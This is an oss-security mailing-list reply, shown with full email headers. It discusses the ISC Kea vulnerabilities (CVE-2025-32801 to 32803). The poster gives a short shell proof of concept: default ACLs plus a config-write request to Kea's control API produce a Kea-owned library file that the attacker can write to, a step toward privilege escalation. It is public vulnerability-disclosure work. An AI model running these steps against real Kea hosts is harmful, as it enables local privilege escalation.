Received: (qmail 13544 invoked by uid 550); 28 May 2025 18:23:39 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Reply-To: oss-security@lists.openwall.com
x-ms-reactions: disallow
Received: (qmail 13517 invoked from network); 28 May 2025 18:23:39 -0000
Authentication-Results:garm.ovh; auth=pass (GARM-109S0032f7444f4-db54-4448-bb23-04aff08398be,
                    99B821EB379423EA779491C0A280EB282E82DE62) smtp.auth=jwilk@jwilk.net
X-OVh-ClientIp:31.0.176.17
Date: Wed, 28 May 2025 20:23:25 +0200
From: Jakub Wilk <jwilk@jwilk.net>
To: oss-security@lists.openwall.com
Message-ID: <20250528182325.yuupynsufybqvea3@jwilk.net>
Mail-Followup-To: oss-security@lists.openwall.com
References: <2f8f64a2-118d-458e-9f1a-182d4d88ad17@isc.org>
 <aDdGEfMxLaRJzSK9@kasco.suse.de>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii; format=flowed
Content-Disposition: inline
In-Reply-To: <aDdGEfMxLaRJzSK9@kasco.suse.de>
X-Ovh-Tracer-Id: 6098155372169276625
X-VR-SPAMSTATE: OK
X-VR-SPAMSCORE: 0
X-VR-SPAMCAUSE: gggruggvucftvghtrhhoucdtuddrgeeffedrtddtgddvfeeljeculddtuddrgeefvddrtddtmdcutefuodetggdotefrodftvfcurfhrohhfihhlvgemucfqggfjpdevjffgvefmvefgnecuuegrihhlohhuthemucehtddtnecunecujfgurhepfffhvffukfhfgggtuggjsehttdertddttddvnecuhfhrohhmpeflrghkuhgsucghihhlkhcuoehjfihilhhksehjfihilhhkrdhnvghtqeenucggtffrrghtthgvrhhnpeelfeevfeduheeihfeuledvveeiteevgfekieefveekleffgfeiieefkeevieejkeenucfkphepuddvjedrtddrtddruddpfedurddtrddujeeirddujeenucevlhhushhtvghrufhiiigvpedtnecurfgrrhgrmhepihhnvghtpeduvdejrddtrddtrddupdhmrghilhhfrhhomhepjhifihhlkhesjhifihhlkhdrnhgvthdpnhgspghrtghpthhtohepuddprhgtphhtthhopehoshhsqdhsvggtuhhrihhthieslhhishhtshdrohhpvghnfigrlhhlrdgtohhmpdfovfetjfhoshhtpehmohehfeegmgdpmhhouggvpehsmhhtphhouhht
DKIM-Signature: a=rsa-sha256; bh=8oXtjaw6WvJE7kZs0iUJug55H/jVFGC4CKVzjvnOvQY=;
 c=relaxed/relaxed; d=jwilk.net; h=From; s=ovhmo917968-selector1;
 t=1748456610; v=1;
 b=e4548VLw4tiE92YOwhXxCdJ2biQrTD2IOemmT3OlQ3oTBFO9Qwa0R+1nQ5vquzQuz3hYQ3ix
 YofpEWAGR4f+Xs9za70GeLUhs9SLonuadvIS+uXP23iUXlcbuJQoLQLmT5tO7nUGRYdgk7pIwCj
 FnlWB+KPkFSmY27j8Xr73DdnMLtjsmkIiLx2iew0hNHfilfut/Br6uCT/u2uXLVfuVtBpfFNoZH
 7ZnJMKyTSYdNyLDePmrdAs0nXlSVrz9hXvA7wAD9NWEFDr+vSq5DjGwJHtGIDMjHQHf+8C6E/GY
 XnTxUmjCistkIe7kg/+pPdrSepnGpNTs1Kad8d4wvsoPw==
Subject: Re: [oss-security] ISC has disclosed three vulnerabilities in Kea
 (CVE-2025-32801, CVE-2025-32802, CVE-2025-32803)

* Matthias Gerstner <mgerstner@suse.de>, 2025-05-28 19:21:
>By leveraging issue 3.2), the Kea services can be instructed to create 
>`_kea` owned files in the attacker's `$HOME/.Private`. The content of 
>the created files is not fully attacker controlled, however, so it will 
>not be possible to craft a valid ELF object for loading via `dlopen()` 
>this way. By placing a setgid-directory in `$HOME/.Private/evil-dir`, 
>any files created in this directory will even have the group-ownership 
>of the attacker. The file mode will be 0644, however,

Default ACLs to the rescue!

$ chmod a+x ~
$ mkdir -m 777 ~/.Private
$ setfacl -d -m u:$LOGNAME:rwx ~/.Private/
$ curl -s -H "Content-Type: application/json" -d '{ "command": "config-write", "arguments": { "filename": "'"$HOME"'/.Private/libexploit.so" } }' localhost:8000 > /dev/null
$ echo pwned > ~/.Private/libexploit.so
$ ls -l ~/.Private/libexploit.so
-rw-rw-rw-+ 1 _kea _kea 6 May 28 18:15 /home/jwilk/.Private/libexploit.so
$ cat ~/.Private/libexploit.so
pwned

-- 
Jakub Wilk
